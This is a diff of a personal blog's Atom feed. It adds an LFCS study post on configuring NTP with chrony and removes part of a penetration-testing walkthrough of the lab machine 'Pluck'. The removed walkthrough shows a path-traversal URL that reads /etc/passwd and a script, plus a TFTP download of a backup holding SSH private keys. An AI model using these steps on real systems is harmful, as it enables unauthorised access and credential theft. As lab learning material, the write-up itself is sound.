@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-02-13T12:48:13-05:00</updated>
+  <updated>2018-02-14T15:00:41-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,314 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[LFCS prep - NTP configuration]]></title>
+    <link href="http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration/"/>
+    <updated>2018-02-14T14:50:41-05:00</updated>
+    <id>http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration</id>
+    <content type="html"><![CDATA[<p>In this post we&rsquo;ll look at NTP configuration by using chrony, which is installed by default on newer RedHat systems.</p>
+
+<!-- more -->
+
+
+<p>Ensure that the <strong>chronyd</strong> service is started and let&rsquo;s take a look at the current time setttings:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl
+</span><span class='line'>      Local time: Thu 2018-02-15 02:15:51 JST
+</span><span class='line'>  Universal time: Wed 2018-02-14 17:15:51 UTC
+</span><span class='line'>        RTC time: Wed 2018-02-14 17:15:52
+</span><span class='line'>       Time zone: Asia/Tokyo (JST, +0900)
+</span><span class='line'>     NTP enabled: no
+</span><span class='line'>NTP synchronized: no
+</span><span class='line'> RTC in local TZ: no
+</span><span class='line'>      DST active: n/a</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now look inside chrony&rsquo;s config file, which is <code>/etc/chrony.conf</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Use public servers from the pool.ntp.org project.
+</span><span class='line'># Please consider joining the pool (http://www.pool.ntp.org/join.html).
+</span><span class='line'>server 0.rhel.pool.ntp.org iburst
+</span><span class='line'>server 1.rhel.pool.ntp.org iburst
+</span><span class='line'>server 2.rhel.pool.ntp.org iburst
+</span><span class='line'>server 3.rhel.pool.ntp.org iburst
+</span><span class='line'>
+</span><span class='line'># Ignore stratum in source selection.
+</span><span class='line'>stratumweight 0
+</span><span class='line'>
+</span><span class='line'># Record the rate at which the system clock gains/losses time.
+</span><span class='line'>driftfile /var/lib/chrony/drift
+</span><span class='line'>
+</span><span class='line'># Enable kernel RTC synchronization.
+</span><span class='line'>rtcsync
+</span><span class='line'>
+</span><span class='line'># In first three updates step the system clock instead of slew
+</span><span class='line'># if the adjustment is larger than 10 seconds.
+</span><span class='line'>makestep 10 3
+</span><span class='line'>
+</span><span class='line'># Allow NTP client access from local network.
+</span><span class='line'>#allow 192.168/16
+</span><span class='line'>
+</span><span class='line'># Listen for commands only on localhost.
+</span><span class='line'>bindcmdaddress 127.0.0.1
+</span><span class='line'>bindcmdaddress ::1
+</span><span class='line'>
+</span><span class='line'># Serve time even if not synchronized to any NTP server.
+</span><span class='line'>#local stratum 10
+</span><span class='line'>
+</span><span class='line'>keyfile /etc/chrony.keys
+</span><span class='line'>
+</span><span class='line'># Specify the key used as password for chronyc.
+</span><span class='line'>commandkey 1
+</span><span class='line'>
+</span><span class='line'># Generate command key if missing.
+</span><span class='line'>generatecommandkey
+</span><span class='line'>
+</span><span class='line'># Disable logging of client accesses.
+</span><span class='line'>noclientlog
+</span><span class='line'>
+</span><span class='line'># Send a message to syslog if a clock adjustment is larger than 0.5 seconds.
+</span><span class='line'>logchange 0.5
+</span><span class='line'>
+</span><span class='line'>logdir /var/log/chrony
+</span><span class='line'>#log measurements statistics tracking</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a set of default servers configured, but you can add your own. You can also allow NTP client access in the local network by uncommenting or adding the <strong>allow</strong> directive with a range.</p>
+
+<p>In the previous timedatectl output we saw that NTP and synchronization weren&rsquo;t enabled, so let&rsquo;s enable them:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl set-ntp 1
+</span><span class='line'>timedatectl | grep -i ntp
+</span><span class='line'>     NTP enabled: yes
+</span><span class='line'>NTP synchronized: no</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We still have to manage the NTP synchronization. In the config file we have some server pools enabled, but we want to know exact names for the servers:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc sources -v
+</span><span class='line'>210 Number of sources = 4
+</span><span class='line'>
+</span><span class='line'>  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.
+</span><span class='line'> / .- Source state '*' = current synced, '+' = combined , '-' = not combined,
+</span><span class='line'>| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.
+</span><span class='line'>||                                                 .- xxxx [ yyyy ] +/- zzzz
+</span><span class='line'>||      Reachability register (octal) -.           |  xxxx = adjusted offset,
+</span><span class='line'>||      Log2(Polling interval) --.      |          |  yyyy = measured offset,
+</span><span class='line'>||                                \     |          |  zzzz = estimated error.
+</span><span class='line'>||                                 |    |           \
+</span><span class='line'>MS Name/IP address         Stratum Poll Reach LastRx Last sample
+</span><span class='line'>===============================================================================
+</span><span class='line'>^? ts1.sct.de                    0   8     0   10y     +0ns[   +0ns] +/-    0ns
+</span><span class='line'>^? greenstone-quarry.the-jad     0   8     0   10y     +0ns[   +0ns] +/-    0ns
+</span><span class='line'>^? 1b.ncomputers.org             0   8     0   10y     +0ns[   +0ns] +/-    0ns
+</span><span class='line'>^? shout.ovh                     0   8     0   10y     +0ns[   +0ns] +/-    0ns</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can pick a server to synchronize with:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ntpdate -vd ts1.sct.de
+</span><span class='line'>15 Feb 02:37:52 ntpdate[9511]: ntpdate 4.2.6p5@1.2349-o Wed Mar  1 09:00:52 UTC 2017 (1)
+</span><span class='line'>Looking for host ts1.sct.de and service ntp
+</span><span class='line'>host found : ts1.sct.de
+</span><span class='line'>transmit(193.141.27.1)
+</span><span class='line'>receive(193.141.27.1)
+</span><span class='line'>transmit(193.141.27.1)
+</span><span class='line'>receive(193.141.27.1)
+</span><span class='line'>transmit(193.141.27.1)
+</span><span class='line'>receive(193.141.27.1)
+</span><span class='line'>transmit(193.141.27.1)
+</span><span class='line'>receive(193.141.27.1)
+</span><span class='line'>server 193.141.27.1, port 123
+</span><span class='line'>stratum 2, precision -24, leap 00, trust 000
+</span><span class='line'>refid [193.141.27.1], delay 0.07736, dispersion 0.00209
+</span><span class='line'>transmitted 4, in filter 4
+</span><span class='line'>reference time:    de2ec48b.aba7efb5  Wed, Feb 14 2018 23:22:03.670
+</span><span class='line'>originate timestamp: de2ec847.3cbf5eb1  Wed, Feb 14 2018 23:37:59.237
+</span><span class='line'>transmit timestamp:  de2ef276.d94d8084  Thu, Feb 15 2018  2:37:58.848
+</span><span class='line'>filter delay:  0.07916  0.07736  0.08383  0.07954 
+</span><span class='line'>         0.00000  0.00000  0.00000  0.00000 
+</span><span class='line'>filter offset: -10799.6 -10799.6 -10799.6 -10799.6
+</span><span class='line'>         0.000000 0.000000 0.000000 0.000000
+</span><span class='line'>delay 0.07736, dispersion 0.00209
+</span><span class='line'>offset -10799.642908
+</span><span class='line'>
+</span><span class='line'>15 Feb 02:37:58 ntpdate[9511]: step time server 193.141.27.1 offset -10799.642908 sec</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To get more information about the NTP status, check the tracking:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc tracking
+</span><span class='line'>Reference ID    : 193.141.27.1 (ts1.sct.de)
+</span><span class='line'>Stratum         : 3
+</span><span class='line'>Ref time (UTC)  : Wed Feb 14 14:41:11 2018
+</span><span class='line'>System time     : 0.000000000 seconds fast of NTP time
+</span><span class='line'>Last offset     : +10799.637695312 seconds
+</span><span class='line'>RMS offset      : 10799.637695312 seconds
+</span><span class='line'>Frequency       : 0.000 ppm fast
+</span><span class='line'>Residual freq   : -1.456 ppm
+</span><span class='line'>Skew            : 1000000.000 ppm
+</span><span class='line'>Root delay      : 0.069487 seconds
+</span><span class='line'>Root dispersion : 1528.844971 seconds
+</span><span class='line'>Update interval : 0.0 seconds
+</span><span class='line'>Leap status     : Normal</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can see the server in the Reference ID and the Leap status that confirms the synchronization. Also re-check with timedatectl that NTP is working:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl | grep -i ntp
+</span><span class='line'>     NTP enabled: yes
+</span><span class='line'>NTP synchronized: yes</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ Give thought to your reputation.       \
+</span><span class='line'>| Consider changing name and moving to a |
+</span><span class='line'>\ new town.                              /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[LFCS prep - Configuring SGID directories]]></title>
@@ -8870,614 +9178,6 @@ base 10 numbers were good places to start and end groups of machines.</p></block
 </span><span class='line'>            (__)\       )\/\
 </span><span class='line'>                ||----w |
 </span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Got Pluck?]]></title>
-    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
-    <updated>2017-07-06T06:28:41-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
-    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>
-
-<!-- more -->
-
-
-<h2>Recon</h2>
-
-<p>Nmap results:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
-</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
-</span><span class='line'>|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
-</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
-</span><span class='line'>|_http-title: Pluck
-</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)
-</span><span class='line'>5355/tcp open  llmnr?</span></code></pre></td></tr></table></div></figure>
-
-
-<p>First order of business, the web server:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/pluck.png" title="pluck" alt="pluck"></p>
-
-<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
-</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
-</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
-</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
-</span><span class='line'>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
-</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
-</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
-</span><span class='line'>+ OSVDB-3092: /admin.php: This might be interesting...
-</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
-</span><span class='line'>+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
-</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
-</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
-</span><span class='line'>+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
-</span><span class='line'>+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/pluck/admin.png" title="admin" alt="admin sqli"></p>
-
-<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
-</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
-</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
-</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
-</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</span><span class='line'>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-</span><span class='line'>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-</span><span class='line'>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-</span><span class='line'>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-</span><span class='line'>syslog:x:104:108::/home/syslog:/bin/false
-</span><span class='line'>_apt:x:105:65534::/nonexistent:/bin/false
-</span><span class='line'>messagebus:x:106:109::/var/run/dbus:/bin/false
-</span><span class='line'>mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
-</span><span class='line'>lxd:x:108:65534::/var/lib/lxd/:/bin/false
-</span><span class='line'>uuidd:x:109:114::/run/uuidd:/bin/false
-</span><span class='line'>dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-</span><span class='line'>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
-</span><span class='line'>pollinate:x:112:1::/var/cache/pollinate:/bin/false
-</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
-</span><span class='line'>Debian-exim:x:113:119::/var/spool/exim4:/bin/false
-</span><span class='line'>peter:x:1001:1001:,,,:/home/peter:/bin/bash
-</span><span class='line'>paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
-</span><span class='line'>backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The last entry is interesting. I used the LFI to look at the script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>########################
-</span><span class='line'># Server Backup script #
-</span><span class='line'>########################
-</span><span class='line'>
-</span><span class='line'>#Backup directories in /backups so we can get it via tftp
-</span><span class='line'>
-</span><span class='line'>echo "Backing up data"
-</span><span class='line'>tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2& &gt; /dev/null
-</span><span class='line'>echo "Backup complete"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sU -p69 192.168.217.147
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-06 09:59 EDT
-</span><span class='line'>Nmap scan report for 192.168.217.147
-</span><span class='line'>Host is up (0.00016s latency).
-</span><span class='line'>PORT   STATE         SERVICE
-</span><span class='line'>69/udp open|filtered tftp</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I got the archive via T<a href="FTP:">FTP:</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.147
-</span><span class='line'>tftp&gt; get /backups/backup.tar
-</span><span class='line'>Received 1824718 bytes in 1.4 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Extracted it to find some home directory contents, besides the source for the website:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>tar -xvf backup.tar 
-</span><span class='line'>home/
-</span><span class='line'>home/bob/
-</span><span class='line'>home/bob/.bashrc
-</span><span class='line'>home/bob/.sudo_as_admin_successful
-</span><span class='line'>home/bob/.profile
-</span><span class='line'>home/bob/.bash_logout
-</span><span class='line'>home/paul/
-</span><span class='line'>home/paul/keys/
-</span><span class='line'>home/paul/keys/id_key3.pub
-</span><span class='line'>home/paul/keys/id_key2.pub
-</span><span class='line'>home/paul/keys/id_key2
-</span><span class='line'>home/paul/keys/id_key4.pub
-</span><span class='line'>home/paul/keys/id_key5.pub
-</span><span class='line'>home/paul/keys/id_key6
-</span><span class='line'>home/paul/keys/id_key1
-</span><span class='line'>home/paul/keys/id_key5
-</span><span class='line'>home/paul/keys/id_key1.pub
-</span><span class='line'>home/paul/keys/id_key6.pub
-</span><span class='line'>home/paul/keys/id_key4
-</span><span class='line'>home/paul/keys/id_key3
-</span><span class='line'>home/paul/.bashrc
-</span><span class='line'>home/paul/.profile
-</span><span class='line'>home/paul/.bash_logout
-</span><span class='line'>home/peter/
-</span><span class='line'>home/peter/.bashrc
-</span><span class='line'>home/peter/.profile
-</span><span class='line'>home/peter/.bash_logout
-</span><span class='line'>var/www/html/
-</span><span class='line'>var/www/html/fonts/
-</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.svg
-</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff2
-</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.ttf
-</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff
-</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.eot
-</span><span class='line'>var/www/html/about.php
-</span><span class='line'>var/www/html/index.php
-</span><span class='line'>var/www/html/footer.php
-</span><span class='line'>var/www/html/css/
-</span><span class='line'>var/www/html/css/bootstrap.css.map
-</span><span class='line'>var/www/html/css/bootstrap.min.css.map
-</span><span class='line'>var/www/html/css/bootstrap-theme.css
-</span><span class='line'>var/www/html/css/bootstrap-theme.min.css
-</span><span class='line'>var/www/html/css/bootstrap.min.css
-</span><span class='line'>var/www/html/css/bootstrap-theme.min.css.map
-</span><span class='line'>var/www/html/css/bootstrap-theme.css.map
-</span><span class='line'>var/www/html/css/bootstrap.css
-</span><span class='line'>var/www/html/header.php
-</span><span class='line'>var/www/html/admin.php
-</span><span class='line'>var/www/html/js/
-</span><span class='line'>var/www/html/js/jquery.min.js
-</span><span class='line'>var/www/html/js/bootstrap.js
-</span><span class='line'>var/www/html/js/npm.js
-</span><span class='line'>var/www/html/js/bootstrap.min.js</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Bob&rsquo;s directory:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/bob# ls -la
